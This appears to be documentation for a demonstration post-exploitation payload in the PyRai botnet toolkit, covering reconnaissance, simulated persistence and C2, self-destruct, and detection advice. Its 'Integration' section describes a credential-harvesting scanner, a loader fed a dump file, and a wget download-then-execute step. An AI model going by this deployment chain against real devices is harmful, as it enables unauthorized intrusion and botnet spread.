# PyRai Advanced Test Payload Documentation

**ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.**

## Overview

The PyRai Advanced Test Payload is a sophisticated security testing tool designed to demonstrate post-exploitation capabilities in controlled environments while maintaining strict safety measures.

## Key Features

### 🛡️ Safety Mechanisms

1. **Environment Validation**
   - Checks for testing environment indicators
   - Validates hostname for test/lab/vm/sandbox keywords
   - Requires authorization markers
   - Only operates in TESTING_MODE

2. **Self-Destruct Timer**
   - **Default**: 5 minutes (300 seconds)
   - **Maximum Runtime**: 10 minutes
   - **Automatic Cleanup**: Removes all created files
   - **Manual Override**: Can be triggered manually

3. **Network Restrictions**
   - Limited to RFC 3927 test ranges (192.0.2.0/24)
   - Localhost communication only
   - No external network access

### 🔍 Reconnaissance Capabilities

#### System Information Gathering
- **Hostname** and platform details
- **Architecture** and processor information
- **Current user** and directory context
- **Process information** (limited for safety)
- **Network addresses** (local only)
- **Environment variables** (filtered)

#### Network Discovery
- **Limited Host Scanning**: Only first 4 IPs in test range
- **Ping Sweeps**: Basic connectivity testing
- **Service Discovery**: Simulated only
- **Port Scanning**: Demonstration only

### 🔄 Persistence Demonstration

All persistence techniques are **SIMULATED ONLY** and do not actually create persistent access:

1. **Cron Job Persistence**
   - Shows cron entry format
   - Demonstrates scheduling techniques
   - **Status**: Simulated only

2. **Startup Script Persistence**
   - Registry entries (Windows)
   - Init scripts (Linux)
   - **Status**: Simulated only

3. **Service-Based Persistence**
   - System service creation concepts
   - Service configuration examples
   - **Status**: Simulated only

### 📡 C2 Communication Demonstration

All communication techniques are **SIMULATED ONLY**:

1. **HTTP Beacon**
   - Demonstrates beacon intervals
   - Shows HTTP-based communication
   - **Target**: Localhost only

2. **DNS Tunneling**
   - TXT record exfiltration concepts
   - Domain-based communication
   - **Status**: Simulated only

3. **Encrypted Channels**
   - AES-256-GCM encryption concepts
   - ECDH key exchange demonstration
   - **Status**: Simulated only

## Execution Phases

### Phase 1: Safety Validation
```
✅ Environment validation
✅ Authorization marker creation
⏰ Self-destruct timer initialization
```

### Phase 2: System Reconnaissance
```
🔍 Hostname and platform enumeration
🔍 User and process information
🔍 Network interface discovery
🔍 Environment variable collection
```

### Phase 3: Network Discovery
```
🌐 Local network ping sweep (limited)
🌐 Host discovery in test ranges
🌐 Service enumeration (simulated)
```

### Phase 4: Persistence Analysis
```
🔄 Cron job techniques (simulated)
🔄 Startup script methods (simulated)
🔄 Service persistence (simulated)
```

### Phase 5: C2 Communication
```
📡 HTTP beacon demonstration
📡 DNS tunneling concepts
📡 Encrypted channel examples
```

### Phase 6: Results and Cleanup
```
💾 JSON results export
🧹 Automatic file cleanup
💥 Self-destruct execution
```

## Output Files

### Results File
- **Location**: `/tmp/pyrai_recon.json` (Linux) or `C:\temp\pyrai_recon.json` (Windows)
- **Format**: JSON with structured results
- **Content**: All reconnaissance data and demonstrations

### Authorization Marker
- **Location**: `/tmp/pyrai_authorized` (Linux) or `C:\temp\pyrai_authorized` (Windows)
- **Purpose**: Indicates authorized testing session
- **Cleanup**: Removed during self-destruct

### Test Marker
- **Location**: `/tmp/pyrai_test.txt` (Linux) or `C:\temp\pyrai_test.txt` (Windows)
- **Purpose**: Proves successful execution
- **Cleanup**: Removed during self-destruct

## Safety Configuration

### Testing Mode Variables
```python
TESTING_MODE = True                    # Safety enabled
SELF_DESTRUCT_TIMER = 300             # 5 minutes
MAX_RUNTIME = 600                     # 10 minutes maximum
AUTHORIZED_NETWORKS = ["192.0.2.0/24", "127.0.0.0/8"]
```

### Environment Validation
- Hostname must contain: 'test', 'lab', 'vm', 'sandbox', 'demo'
- Authorization marker file must exist or be creatable
- TESTING_MODE must be enabled

## Usage Examples

### Basic Execution
```bash
python3 bin/test_payload.py
```

### Expected Output
```
============================================================
PyRai Advanced Test Payload - Enhanced Security Testing
ETHICAL DISCLAIMER: This tool is for authorized testing only.
============================================================

✅ Safety checks passed - Authorized testing environment detected
⏰ Self-destruct timer set for 300 seconds
🕒 Execution started at: 2024-01-15T10:30:00

🔍 Phase 1: System Reconnaissance
✓ Gathered system information for test-vm-01

🌐 Phase 2: Network Discovery
✓ Network scan completed

🔄 Phase 3: Persistence Techniques (Demonstration)
✓ Persistence techniques demonstrated (simulated only)

📡 Phase 4: C2 Communication (Demonstration)
✓ C2 communication techniques demonstrated (simulated only)

💾 Results saved to: /tmp/pyrai_recon.json

📊 EXECUTION SUMMARY
========================================
Hostname: test-vm-01
Platform: Linux-5.4.0-x86_64
Current User: testuser
Active Hosts Found: 0
Persistence Methods: 3
C2 Methods: 3

⚠️  WARNING: This was a demonstration payload
⚠️  All techniques were simulated for testing purposes
⚠️  Self-destruct will activate in 300 seconds

⏳ Payload execution completed. Waiting for self-destruct...

==================================================
SELF-DESTRUCT SEQUENCE INITIATED
==================================================
✓ Payload file /tmp/test_payload.py removed
✓ Cleaned up /tmp/pyrai_test.txt
✓ Cleaned up /tmp/pyrai_authorized
✓ Cleaned up /tmp/pyrai_recon.json
✓ Self-destruct completed successfully
==================================================
```

## Security Controls

### 1. Execution Limits
- **Time Limit**: Maximum 10 minutes execution
- **Network Limit**: Test ranges only
- **File System**: Temporary files only
- **Process Limit**: Read-only process enumeration

### 2. Data Protection
- **No Sensitive Data**: Avoids collecting passwords or keys
- **Filtered Output**: Environment variables are filtered
- **Limited Scope**: Only safe system information

### 3. Cleanup Mechanisms
- **Automatic**: Self-destruct timer
- **Manual**: Exception-triggered cleanup
- **Complete**: All created files removed

## Integration with PyRai

### Deployment via Loader
```bash
# 1. Start relay
python relay.py

# 2. Start scanner (to collect credentials)
python scanner.py

# 3. Deploy payload using loader
python loader.py dump/csdb.txt
```

### Loader Integration
- **HTTP Server**: Serves payload on port 31338
- **Download Command**: `wget http://127.0.0.1:31338/test_payload.py`
- **Execution**: `python3 test_payload.py`
- **Cleanup**: Automatic removal after execution

## Monitoring and Detection

### Log Indicators
- Process creation: `python3 test_payload.py`
- File creation in `/tmp/` or `C:\temp\`
- Network connections to localhost:31338
- JSON file creation with reconnaissance data

### Behavioral Indicators
- System information enumeration
- Limited network scanning
- File creation and deletion patterns
- Short-lived process execution

## Defensive Recommendations

### Detection
1. **Monitor** for process execution patterns
2. **Watch** temporary file creation
3. **Alert** on system enumeration activities
4. **Track** network scanning attempts

### Prevention
1. **Disable** unnecessary services (telnet)
2. **Change** default credentials
3. **Implement** network segmentation
4. **Deploy** endpoint detection tools

### Response
1. **Isolate** affected systems
2. **Analyze** reconnaissance data
3. **Patch** identified vulnerabilities
4. **Update** security controls

## Legal and Ethical Considerations

### Authorized Use Only
- **Written Permission**: Required for all testing
- **Scope Limitations**: Respect testing boundaries
- **Documentation**: Maintain detailed test logs
- **Responsible Disclosure**: Report findings appropriately

### Prohibited Uses
- Unauthorized system access
- Production environment testing
- Malicious activities
- Criminal purposes

---

**Remember**: This payload is designed for educational and authorized security testing only. Always ensure proper authorization before use and follow responsible disclosure practices for any vulnerabilities discovered. 